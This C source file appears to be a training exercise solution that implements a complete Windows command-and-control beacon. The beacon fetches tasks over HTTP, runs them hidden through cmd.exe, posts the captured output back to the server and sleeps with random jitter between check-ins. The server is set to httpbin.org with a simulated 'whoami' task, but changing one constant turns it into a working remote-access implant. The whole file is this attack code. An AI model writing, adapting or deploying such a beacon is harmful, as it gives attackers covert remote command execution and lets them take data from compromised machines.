/*
 * Solution 03: Beacon Check-in Pattern
 *
 * This solution demonstrates:
 * - Complete beacon implementation
 * - Command execution with output capture
 * - Task/result JSON handling
 * - Beacon loop with jitter
 *
 * Compilation: cl /W4 ex03-beacon-checkin-solution.c /link winhttp.lib
 */

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#pragma comment(lib, "winhttp.lib")

#define C2_SERVER L"httpbin.org"
#define C2_PORT INTERNET_DEFAULT_HTTP_PORT
#define TASK_ENDPOINT L"/get"
#define RESULT_ENDPOINT L"/post"
#define BEACON_INTERVAL 5000

BOOL FetchTask(char* taskBuffer, DWORD bufferSize) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL result = FALSE;

    wprintf(L"[+] Fetching task...\n");

    hSession = WinHttpOpen(L"BeaconAgent/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return FALSE;

    hConnect = WinHttpConnect(hSession, C2_SERVER, C2_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    hRequest = WinHttpOpenRequest(hConnect, L"GET", TASK_ENDPOINT, NULL,
                                 WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD statusCode = 0;
            DWORD statusSize = sizeof(statusCode);

            WinHttpQueryHeaders(hRequest,
                              WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                              WINHTTP_HEADER_NAME_BY_INDEX,
                              &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);

            if (statusCode == 200) {
                DWORD availableBytes = 0;
                DWORD totalRead = 0;

                while (WinHttpQueryDataAvailable(hRequest, &availableBytes) && availableBytes > 0) {
                    DWORD bytesToRead = (availableBytes > bufferSize - totalRead - 1) ?
                                       bufferSize - totalRead - 1 : availableBytes;
                    DWORD bytesRead = 0;

                    if (WinHttpReadData(hRequest, taskBuffer + totalRead, bytesToRead, &bytesRead)) {
                        totalRead += bytesRead;
                    }

                    if (totalRead >= bufferSize - 1) break;
                }

                taskBuffer[totalRead] = '\0';
                result = (totalRead > 0);
            }
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return result;
}

BOOL ParseTask(const char* taskJson, char* command, DWORD commandSize) {
    // Simple JSON parsing - in real C2, use proper JSON library
    // For demo, we'll simulate task data since httpbin doesn't send commands

    // In real scenario, look for: "command": "value"
    const char* cmdStart = strstr(taskJson, "\"command\"");
    if (cmdStart) {
        cmdStart = strchr(cmdStart, ':');
        if (cmdStart) {
            cmdStart = strchr(cmdStart, '"');
            if (cmdStart) {
                cmdStart++;
                const char* cmdEnd = strchr(cmdStart, '"');
                if (cmdEnd) {
                    size_t len = cmdEnd - cmdStart;
                    if (len < commandSize) {
                        strncpy_s(command, commandSize, cmdStart, len);
                        command[len] = '\0';
                        return TRUE;
                    }
                }
            }
        }
    }

    // Simulate task for demo
    strcpy_s(command, commandSize, "whoami");
    return TRUE;
}

BOOL ExecuteTask(const char* command, char* output, DWORD outputSize) {
    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES sa;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    BOOL result = FALSE;

    wprintf(L"[+] Executing command: %S\n", command);

    ZeroMemory(&sa, sizeof(SECURITY_ATTRIBUTES));
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        wprintf(L"[!] CreatePipe failed: %lu\n", GetLastError());
        return FALSE;
    }

    if (!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
        wprintf(L"[!] SetHandleInformation failed: %lu\n", GetLastError());
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return FALSE;
    }

    ZeroMemory(&si, sizeof(STARTUPINFOA));
    si.cb = sizeof(STARTUPINFOA);
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    si.dwFlags |= STARTF_USESTDHANDLES;

    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    char cmdLine[512];
    sprintf_s(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", command);

    if (CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                      NULL, NULL, &si, &pi)) {

        CloseHandle(hWritePipe);
        hWritePipe = NULL;

        DWORD totalRead = 0;
        DWORD bytesRead = 0;
        char buffer[4096];

        while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
            if (totalRead + bytesRead < outputSize - 1) {
                memcpy(output + totalRead, buffer, bytesRead);
                totalRead += bytesRead;
            } else {
                break;
            }
        }

        output[totalRead] = '\0';

        WaitForSingleObject(pi.hProcess, 5000);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        wprintf(L"[+] Output: %S\n", output);
        result = TRUE;

    } else {
        wprintf(L"[!] CreateProcess failed: %lu\n", GetLastError());
    }

    if (hWritePipe) CloseHandle(hWritePipe);
    if (hReadPipe) CloseHandle(hReadPipe);

    return result;
}

BOOL SendResults(const char* taskId, const char* output) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL result = FALSE;

    wprintf(L"[+] Sending results...\n");

    char jsonData[8192];
    sprintf_s(jsonData, sizeof(jsonData),
        "{\n"
        "  \"task_id\": \"%s\",\n"
        "  \"status\": \"success\",\n"
        "  \"output\": \"%s\"\n"
        "}",
        taskId,
        output
    );

    hSession = WinHttpOpen(L"BeaconAgent/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return FALSE;

    hConnect = WinHttpConnect(hSession, C2_SERVER, C2_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    hRequest = WinHttpOpenRequest(hConnect, L"POST", RESULT_ENDPOINT, NULL,
                                 WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    wchar_t headers[] = L"Content-Type: application/json";

    if (WinHttpSendRequest(hRequest, headers, (DWORD)-1, (LPVOID)jsonData,
                          (DWORD)strlen(jsonData), (DWORD)strlen(jsonData), 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD statusCode = 0;
            DWORD statusSize = sizeof(statusCode);

            WinHttpQueryHeaders(hRequest,
                              WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                              WINHTTP_HEADER_NAME_BY_INDEX,
                              &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);

            if (statusCode == 200) {
                wprintf(L"[+] Results sent successfully\n");
                result = TRUE;
            }
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return result;
}

DWORD ApplyJitter(DWORD interval, DWORD jitterPercent) {
    // Bonus: Add random jitter +/- jitterPercent
    int jitterRange = (int)(interval * jitterPercent / 100);
    int jitter = (rand() % (jitterRange * 2 + 1)) - jitterRange;
    DWORD newInterval = (DWORD)((int)interval + jitter);

    wprintf(L"[*] Sleep interval: %lu ms (jitter: %+d ms)\n", newInterval, jitter);

    return newInterval;
}

void BeaconLoop(DWORD iterations) {
    char taskBuffer[8192];
    char command[512];
    char output[4096];
    DWORD checkInCount = 0;

    srand((unsigned int)time(NULL));

    wprintf(L"\n[*] Starting beacon loop\n");
    wprintf(L"[*] C2 Server: %s:%lu\n", C2_SERVER, C2_PORT);
    wprintf(L"[*] Beacon Interval: %lu ms\n", BEACON_INTERVAL);
    wprintf(L"[*] Iterations: %lu\n\n", iterations);

    for (DWORD i = 0; i < iterations; i++) {
        checkInCount++;
        wprintf(L"\n========== Check-in #%lu ==========\n", checkInCount);

        // Step 1: Fetch task
        if (FetchTask(taskBuffer, sizeof(taskBuffer))) {

            // Step 2: Parse task
            if (ParseTask(taskBuffer, command, sizeof(command))) {
                wprintf(L"[+] Task received: %S\n", command);

                // Step 3: Execute command
                if (ExecuteTask(command, output, sizeof(output))) {

                    // Step 4: Send results
                    char taskId[64];
                    sprintf_s(taskId, sizeof(taskId), "TASK-%03lu", checkInCount);
                    SendResults(taskId, output);
                }
            }

        } else {
            wprintf(L"[!] Failed to fetch task\n");
        }

        // Step 5: Sleep with jitter
        if (i < iterations - 1) {
            DWORD sleepTime = ApplyJitter(BEACON_INTERVAL, 20); // 20% jitter
            Sleep(sleepTime);
        }
    }

    wprintf(L"\n[*] Beacon loop completed (%lu check-ins)\n", checkInCount);
}

int main(void) {
    wprintf(L"[*] Exercise 03 Solution: Beacon Check-in Pattern\n");
    wprintf(L"==================================================\n");

    BeaconLoop(3);

    wprintf(L"\n[*] Solution completed!\n");

    return 0;
}
